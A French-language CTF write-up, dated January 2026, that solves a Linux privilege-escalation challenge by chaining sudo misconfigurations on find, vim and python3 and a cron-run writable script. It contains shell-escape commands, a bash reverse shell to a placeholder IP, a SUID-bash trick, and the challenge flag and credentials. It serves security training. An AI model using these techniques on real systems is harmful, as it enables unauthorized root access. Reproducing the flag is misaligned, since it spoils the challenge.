# Challenge : Configuration idéale

## Informations du challenge

| Catégorie | Difficulté | Points | Auteur |
|-----------|------------|--------|--------|
| Systèmes | Moyen | 300 | YoyoChaud |

**Preuve :** `W3_BeL1v3_In_G0d_4Nd_FdR`

---

## Résumé

Ce challenge est un exercice de privilege escalation Linux qui nécessite de chaîner 4 vulnérabilités de configuration pour passer de l'utilisateur `guest` à `root`. Le flag final se trouve encodé en base64 dans l'historique bash de root.

**Chaîne d'escalade de privilèges :**
```
guest → carlos → miguel → fantasma → root
```

---

## Étape 1 : Connexion initiale et reconnaissance

### Accès SSH

Connexion au système avec les credentials fournis :

```bash
ssh guest@<IP> -p 2222
# Password: lagendarmeriecestgenial
```

### Reconnaissance initiale

Une fois connecté, commencer par explorer l'environnement :

```bash
whoami
# guest

id
# uid=1000(guest) gid=1000(guest) groups=1000(guest)

ls -la ~
# Exploration du répertoire home

sudo -l
# Vérifier les permissions sudo
```

**Résultat de `sudo -l`:**
```
User guest may run the following commands on this host:
    (carlos) NOPASSWD: /usr/bin/find
```

---

## Étape 2 : guest → carlos (Exploitation de find avec sudo)

### Analyse

L'utilisateur `guest` peut exécuter `/usr/bin/find` en tant que `carlos` sans mot de passe. C'est une configuration dangereuse car `find` permet d'exécuter des commandes arbitraires. 
Avant d'exécuter la commande il est important de changer de dossier pour être dans un dossier accessible par les deux users, comme /tmp.

### Exploitation via GTFOBins

Référence: https://gtfobins.github.io/gtfobins/find/

```bash
cd /tmp
sudo -u carlos /usr/bin/find . -exec /bin/bash -p \; -quit
```

**Explication:**
- `sudo -u carlos` : Exécute en tant que carlos
- `/usr/bin/find .` : Cherche dans le répertoire courant
- `-exec /bin/bash -p \;` : Exécute un shell bash avec les privilèges préservés
- `-quit` : Quitte après la première correspondance

### Vérification

```bash
whoami
# carlos

id
# uid=1001(carlos) gid=1001(carlos) groups=1001(carlos)
```

---

## Étape 3 : carlos → miguel (Script writable exécuté par cron)

### Reconnaissance

En tant que carlos, explorer le système pour trouver des vecteurs d'escalade :

```bash
# Vérifier les permissions sudo
sudo -l
# Aucune permission sudo pour carlos

# Chercher des fichiers writables intéressants
find /usr/local/bin -type f -writable 2>/dev/null
# /usr/local/bin/check_network.sh

# Vérifier les permissions
ls -la /usr/local/bin/check_network.sh
# -rwxrwxr-x 1 miguel carlos 89 Jan 15 10:00 /usr/local/bin/check_network.sh
```

### Analyse

Le fichier `/usr/local/bin/check_network.sh` est :
- Propriété de `miguel`
- Groupe `carlos` avec permissions d'écriture
- Probablement exécuté par cron (vérifier `/var/log/network_check.log`)

```bash
cat /usr/local/bin/check_network.sh
# #!/bin/bash
# echo "Network check completed at $(date)" >> /var/log/network_check.log

# Vérifier si le script est exécuté régulièrement
ls -la /var/log/network_check.log
# -rw-r--r-- 1 miguel miguel 450 Jan 15 10:05 /var/log/network_check.log

tail /var/log/network_check.log
# Network check completed at Mon Jan 15 10:00:01 UTC 2024
# Network check completed at Mon Jan 15 10:05:01 UTC 2024
# Le script s'exécute toutes les 5 minutes!
```

### Exploitation

Modifier le script pour obtenir un shell en tant que miguel :

**Méthode 1: Reverse shell bash**

```bash
echo '#!/bin/bash' > /usr/local/bin/check_network.sh
echo 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' >> /usr/local/bin/check_network.sh
```

Puis écouter sur votre machine :
```bash
nc -lvnp 4444
```

**Méthode 2: Copie de bash SUID (plus simple dans un CTF)**

```bash
cat > /usr/local/bin/check_network.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/miguel_shell
chmod 4755 /tmp/miguel_shell
EOF
```

Attendre 5 minutes (ou moins selon le timing), puis :

```bash
/tmp/miguel_shell -p
```

### Vérification

```bash
whoami
# miguel

id
# uid=1001(carlos) gid=1001(carlos) euid=1002(miguel) groups=1001(carlos)
```
Le joueur verra qu'il a encore des droits de Carlos avec cette méthode. Il pourra facilement changer d'utilisateur pour avoir un shell stable en récupérant le mot de passe disponible dans `/home/miguel/motdepasse`.

```bash
cat /home/miguel/motdepasse
# Mon mot de passe : 488484aDz51d5adADZDD541811ZDADAZ
```

---

## Étape 4 : miguel → fantasma (Exploitation de vim avec sudo)

### Reconnaissance

```bash
sudo -l
# User miguel may run the following commands on this host:
#     (fantasma) NOPASSWD: /usr/bin/vim
```

### Exploitation via GTFOBins

Référence : https://gtfobins.github.io/gtfobins/vim/

```bash
sudo -u fantasma /usr/bin/vim -c ':!/bin/bash'
```

Ou de manière plus directe :

```bash
sudo -u fantasma vim -c ':set shell=/bin/bash' -c ':shell'
```

Ou encore plus simple :

```bash
sudo -u fantasma vim
# Puis dans vim, taper :
:!/bin/bash
```

### Vérification

```bash
whoami
# fantasma

id
# uid=1003(fantasma) gid=1003(fantasma) groups=1003(fantasma)
```

---

## Étape 5 : fantasma → root (Exploitation de python3 avec sudo)

### Reconnaissance

```bash
sudo -l
# User fantasma may run the following commands on this host:
#     (root) NOPASSWD: /usr/bin/python3
```

### Exploitation via GTFOBins

Référence: https://gtfobins.github.io/gtfobins/python/

**Méthode 1 : Shell direct**

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**Méthode 2 : Via pty**

```bash
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Méthode 3 : Via execve**

```bash
sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'
```

### Vérification

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Étape 6 : Récupération du flag

### Solution : Bash history

Les fichiers d'historique bash contiennent souvent des commandes sensibles. Vérifier `.bash_history` :

```bash
cat /root/.bash_history
```

**Contenu:**
```
whoami
ls -la
pwd
cat /etc/shadow
echo "VZ2VsY29tZSB0788byB0aGUgZmluYWwgc3RhZ54J2U="
history
VzNfQmVMMXYzX0luX0cwZF80TmRfRmRS
curl https://www.youtube.com/watch?v=dQw4w9WgXcQ
cat /root/proof.txt
ls
cd /home/guest
find /root -name "*.txt"
ls /root/.secret/
```

### Décodage du flag

On remarque une commande suspecte avec une chaîne en base64 :
```bash
VzNfQmVMMXYzX0luX0cwZF80TmRfRmRS
```

Décoder cette chaîne :

```bash
echo "VzNfQmVMMXYzX0luX0cwZF80TmRfRmRS" | base64 -d
# W3_BeL1v3_In_G0d_4Nd_FdR
```
✅ **Preuve :** `W3_BeL1v3_In_G0d_4Nd_FdR`
<!-- 
 author : Yoyochaud
 date	: 15/01/2026
 version: 1.0
--> 
